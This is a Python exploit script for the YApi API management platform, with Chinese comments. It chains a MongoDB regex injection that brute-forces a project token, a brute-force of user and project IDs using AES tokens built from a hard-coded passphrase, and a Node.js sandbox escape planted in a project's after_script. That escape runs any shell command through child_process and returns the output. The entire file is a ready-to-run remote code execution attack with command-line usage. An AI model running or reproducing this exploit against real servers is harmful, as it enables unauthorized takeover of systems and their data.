###yapi mongoSQL注入导致RCE漏洞
###writer： summerainX
###脚本使用方式
###初次使用可以 python yapi_mongo_race.py -url  url -cmd cmd

import requests,json,re
import hashlib
import binascii
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import argparse

choices = 'abcedf0123456789'
script_template = r'''const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
const Buffer = FunctionConstructor('return Buffer')()
const output = process.mainModule.require("child_process").execSync(Buffer.from('%s', 'hex').toString()).toString()
context.responseData = 'testtest' + output + 'testtest'
'''


def compute(passphase: str):
    nkey = 24
    niv = 16
    key = ''
    iv = ''
    p = ''

    while True:
        h = hashlib.md5()
        h.update(binascii.unhexlify(p))
        h.update(passphase.encode())
        p = h.hexdigest()

        i = 0
        n = min(len(p) - i, 2 * nkey)
        nkey -= n // 2
        key += p[i:i + n]
        i += n
        n = min(len(p) - i, 2 * niv)
        niv -= n // 2
        iv += p[i:i + n]
        i += n
        if nkey + niv == 0:
            return binascii.unhexlify(key), binascii.unhexlify(iv)
        
def aes_encode(data):
    key, iv = compute('abcde')
    padder = padding.PKCS7(128).padder()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()
    return binascii.hexlify(ct).decode()


#获取有效token
def get_token(url):
    current = "^"
    for i in range(20):
        for ch in choices:
            guess = current + ch
            data = {
                'id' : -1,
                'token' : {
                    '$regex': guess,
                    '$nin': []
                }
            }
            headers = {
                'Content-Type': 'application/json'
            }
            resp = requests.post(url+"/api/interface/up", data = json.dumps(data), headers=headers)
            res = resp.json()
            if res['errcode'] == 400:
                current =guess
                break
    print("正确的token为：" + current)    

    return current[1:]

#获取 uid pid 
def get_id(url, token):
    for uid in range(1,200):
        params = {
            "token": aes_encode(f'{uid}|{token}')
        }
        resp = requests.get(url+"/api/project/get",params=params)
        data = resp.json()
        if data['errcode'] == 0:
            pid = data['data']['_id']
            print(f"uid是：{uid} ,pid 是:{pid}")
            return uid, pid


#更新项目代码
def update_project(url, token, pid, cmd):
    cmd_hex = cmd.encode().hex()
    script = script_template % cmd_hex
    params = {
        "token" : token
    }
    data = {
        "id" : pid,
        "after_script" : script
    }
    resp = requests.post(url+"/api/project/up",params = params,json = data)
    data = resp.json()
    return data['errcode'] == 0

#执行命令
def run_cmd(url, token):
    for cid in range(200):
        params = {
            'token' : token,
            'id' : cid,
            'mode' : "json"
        }
        resp = requests.get(url+'/api/open/run_auto_test', params=params)
        data = resp.json()
        if 'errcode' in data :
                continue
        else:
            if data['message']['len'] > 0 :
                print("cid是：", cid)
                data = data['list'][0]['res_body']
                result = re.search("testtest(.*?)testtest", data, re.DOTALL)
                print("执行结果：")
                print(result.group(1))
                return cid


#已知cid，执行命令
def run_cmd_by_cid(url, token, cid):
        params = {
            'token' : token,
            'id' : cid,
            'mode' : "json"
        }
        resp = requests.get(url+'/api/open/run_auto_test', params=params)
        data = resp.json()['list'][0]['res_body']
        result = re.search("testtest(.*?)testtest",data,re.DOTALL)
        print("执行结果：")
        print(result.group(1))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-url',  help = '输入目标网站域名',required = True)
    parser.add_argument('-uid',  help = '请输入获取到的用户uid')
    parser.add_argument('-pid',  help = '请输入获取到的项目pid')
    parser.add_argument('-cid',  help = '请输入获取到的项目cid')
    parser.add_argument('-token',  help = '请输入获取到的token')
    parser.add_argument('-cmd',  help = '请输入想要执行的命令',required = True)
    args = parser.parse_args()
    if args.uid == None or args.pid == None or args.token == None or args.cid == None:
        token = get_token(args.url)
        uid,pid = get_id(args.url, token)
        aes_token = aes_encode(f'{uid}|{token}')
        if update_project(args.url, aes_token, pid, args.cmd):
            print("项目更新成功！")
            cid = run_cmd(args.url, aes_token)
            print(f"下次可以执行 python yapi_mongo_rce.py -url {args.url} -token {token} -uid {uid} -pid {pid} -cid {cid}  -cmd whoami")
        else:
            print("项目更新失败！")
    else:
        aes_token = aes_encode(f'{args.uid}|{args.token}')
        if update_project(args.url, aes_token, args.pid, args.cmd):
            print("项目更新成功！")
            cid = run_cmd_by_cid(args.url, aes_token,args.cid)
        else:
            print("项目更新失败！")



if __name__ == '__main__':
    main()